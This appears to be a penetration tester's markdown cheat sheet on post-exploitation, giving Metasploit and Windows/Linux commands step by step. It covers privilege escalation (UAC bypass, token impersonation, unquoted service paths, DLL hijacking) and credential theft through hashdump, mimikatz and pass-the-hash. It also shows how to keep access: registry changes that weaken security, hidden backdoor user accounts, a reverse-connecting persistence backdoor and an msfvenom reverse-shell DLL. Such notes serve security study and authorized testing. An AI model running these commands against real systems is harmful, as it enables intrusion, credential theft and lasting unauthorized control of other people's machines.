> The last step in the penetration testing chain (info gathering -> scanning -> enumeration -> sniffing -> va & exploitation -> post exploitation)

Post exploitation is a cyclic process requiring the application of the same steps if new targets are found in the network

Post exploitation methodology:
1. Privilege escalation + maintaining access
2. Harvesting of data
3. Scanning of the internal network
4. Exploitation of new systems and pivoting
5. Goto 1 (if new machine is found and exploited)

## Enumeration of exploits

- [PEASS](https://github.com/carlospolop/PEASS-ng)

## Privilege escalation

> Extending the rights on a target already exploited from a normal user to either `root` or `NT AUTHORITY\SYSTEM`  (former linux, latter windows)

### General

- check permissions and replace `dlls` and `executables` with your epxploitcode where possible
- inject code into executables [shellter](https://www.shellterproject.com/introducing-shellter/) or [backdoorfactory](https://github.com/secretsquirrel/the-backdoor-factory) -> requires restart of application!

### Windows privilege escalation

Comprised of several steps, in the assumption we use metasploit and have a meterpreter session

1. Maintain access through process migration (same permissions, added stability)

```bash
meterpreter> run post/windows/manage/migrate
```

2. Maintain access with higher permissions

```bash
meterpreter> getsystem  # may no longer work on modern OSes (UAC and AV blocking)

# verify if UAC is activated
msf> use post/windows/gather/win_privs

# if UAC is on and we have no permissions, check for bypass
msf> search bypassuac
msf> use exploit/windows/local/bypassuac_windows_store_filesys  # or other

# verify privilege escalation
msf> use post/windows/gather/win_privs
meterpreter> getsystem  # if we have admin, this should be successfull
```

3. Change the user through tokens and impersonation

With using the `incognito`  module in metasploit

```bash
meterpreter> use incognito
meterpreter> getuid
meterpreter> list_tokens -u
```

After checking what delegation tokens are available, we can impersonate other accounts (without cracking passwords!)

```bash
meterpreter> impersonate_token <domain\\user>  # user from bevore evaluated accs
meterpreter> getuid  # verify
```

#### unqouted service paths

> Abuse search order of the windows system (search current dir before system paths) and the fact that if there are paths with a space, first matching exe wins!

```powershell
c:\this\is a\bad path\example.exe # unqoted has spaces
"c:\this is better\than above\example.exe" # quoted
```

If write permissions are available, we can place our payload in certain fractions of the unqouted path - because search order would access it like this:

1. `c:\this\is.exe`
2. `c:\this\is a\bad.exe`
3. `c:\this\is a\bad path\example.exe`

> Exploit via dropping an `is.exe` under `c:\this\` or a `bad.exe` on path 2

```powershell
# display unqouted service paths with wmic
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Or check the service manually by name

```powershell
sc qc <nameOfService>
```

Using metasploit:

```bash
msf> use exploit/windows/local/unqouted_service_path
```

Or manually replace an exe on that path with your payload an *trigger execution*. Try if you have permissions by:

```powershell
sc stop <serviceInQuestion>
sc start <serviceInQuestion>
sc qc <serviceInQuestion> # displays as who the service is run
```

**IMPORTANT:** We have to be able to start and stop the service to be able to exploit this vulnerability. Or service must be on autostart and we can provoke a crash + restart.

#### UAC bypass

> Tools for bypassing the user account control of windows

- [uacme](https://github.com/hfiref0x/UACME) (has to be compiled with VStudio 2015 or later)

```bash
meterpreter> shell
shell> akagi.exe 58 c:\users\downloads\exploit.exe  # 58 for the method, and the latter the payload that shall be executed
```

### Linux privilege escalation

Some differences to windows, exploitcode may have to be compiled for the target plattform  `x86`, `x86_64`, `arm` and so on...

#### Exploit c Code

Preferably, if there is a compiler on the remote system use that one (okay it may not be silent, but the architecture will be correct!)

```bash
# on remote system with meterpreter
meterpreter> upload /local/path/to/code.c
meterpreter> gcc code.c -o exploit

# local system
apt install gcc-multilib  # allows compiling for other archs
gcc -m32 code.c -o exploit  # compiled for 32-bit
```


## Maintaining access

> To avoid loosing your session and maintain access (as the user can otherwise kill the process) -> **persistence**

Via
- password hashes (windows: pth, or cracking them)
- backdoors
- new user

### Password hash

Simply dump the hashes with meterpreter (requires permissions)

```bash
meterpreter> hashdump  # requires privileges

# for windows specially
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> background
msf> creds
msf> loot
```

The next steps mainly concern windows operating systems

1. Acquire persistence through obtained hashes with `smbexec` 

```bash
msf> use exploit/windows/smb/psexec  # as smbpass use the preiously gained hashes
```

**OnError:** `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` change registry for persistence  

```powershell
Set-ItemProperty -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord

Set-ItemProperty -Path HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
```

Or `cmd` `reg` command:

```powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  

reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```

Registry value `LocalAccountTokenFilterPolicy` allows users in the local admin group to sometimes *pass-the-hash*

2. Use `xfreerdp` for `pth`

```bash
xfreerdp /u:admin /d:domainCorp /pth:<theHashToPass> /v:<IPofTarget>
```

3. Obviously: crack the hashes - if you got the time

- requires x64 process for best performance and functionality 

```bash
meterpreter> ps -A x86_64 -s # possible if NT-System
meterpreter> migrate <PID>
meterpreter> load mimikatz
meterpreter> wdigest # old 
```

4. Windows Credentials Editor [companyWebpage](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### Enable services for persistence

> In order to gain persistence, we may have to enable services so we can connect again (mainly windows)

Show running services on the host

```powershell
net start
wmic service where 'Caption like "<ServiceName>%" and started=true' get Caption
```

```bash
meterpreter> run service_manager -l
meterpreter> run post/windows/gather/enum_services
```

If RDP is disabled, we can enable it with metasploit

```bash
meterpreter> run post/windows/manage/enable_rdp
```

To *add* a new RDP user, do the following

```powershell
net user <username> <password> /add  # create new user
net localgroup "Remote Desktop Users" <username> /add  # add new user to RDP grp
```

### Backdoor with metasploit

> Requires a public IP/DNS-Name for better use (this backdoor is connect back from victim to attacker)

```bash
meterpreter> run persistence -A -X -i 5 -p <attkListeningPort> -r <attkIP>
```

What happens?
1. Creating payload
	- `msfvenom` or `Veil` or `BDF`
2. Uploading file
	- upload: `upload ./backdoor.exe c:\\path\\on\\target`
3. Executing backdoor
4. Adding entry to registry
	- `reg setval -k HKML\\software\\windows\\currentversion\\run -d "c:\path\on\target\backdoor.exe" -v backdoor_name_key`

Check on victim:

```bash
meterpreter> reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v <tempName> # see script output for the temp name
meterpreter> ls c:\\windows\\TEMP\\<tempFileName> # check if vbs has been written
```

-> Start handler in metasploit to accept connection

#### Other metasploit option

```bash
meterpreter> use exploit/windows/local/persistence
meterpreter> set startup system # switch to system privileges
meterpreter> set payload windows/meterpreter/reverse_tcp
```


### Adding new users

> Add new users with a password only we know and that isn't changed by other people

```powershell
net user <username> <password> /add # adds new LOCAL user on the machine
net localgroup "<groupname>" <username> /add
``` 

Add the user also to `RDP` or `telnet` or `ssh` groups!

### DLL hijacking

> Abuse the loadorder of libraries and replace them with malicious files, for further information or mitigation check `dll` loadorder [here](https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1)
> New [source](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

To find programs with this vulnerability we can use `processmonitor` of the `sysinternals` suite:

Filter for a specific serviceBinary to check for:
- `Process Name | is | <serviceBinary> | Include`
- `Result | is | NAME NOT FOUND | Include`

Check the results for paths where write permissions are given and drop your DLL with the *SAME NAME* as in the 'NAME NOT FOUND' result there

#### Creating a dll

With `msfvenom` use the `-f dll` option to create a dll  

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<myIP> LPORT=<myPort> -f dll > payload64.dll
```


## Pillaging

> Or harvesting all interesting data you may find

1. Getting general system information

```powershell
systeminfo  # Windows specific
```

```bash
meterpreter> sysinfo  # general for linux/windows
meterpreter> run post/windows/gather/*  # take the scripts as you need them
```

2. Check what services are running

```powershell
wmic service get Caption,StartName,State,pathname  # wmic - if installed
net start  # net - always available
```

```bash
service --status-all  # linux display of running services
```

3. Check if the machine is part of a domain (windows)

```powershell
net view /domain  # error if not part of domain
net group "Domain Controllers" /Domain  # error if not part of domain
```

4. Check the existing user accounts

```powershell
net user  # only local accounts!
net user /domain  # displays domain users, if part of domain
```

```bash
cat /etc/passwd
```

5. Check groups

```powershell
net localgroup  # local groups
net localgroup Administrators  # shows members of the Admin group
```

```bash
cat /etc/group
```

6. Check for fileshares

```powershell
net share
```

7. Check network information

```bash
meterpreter> ifconfig
meterpreter> run winenum  # for windowos

# otherwise
ip a  # for linux
ipconfig /all  # for windows
```

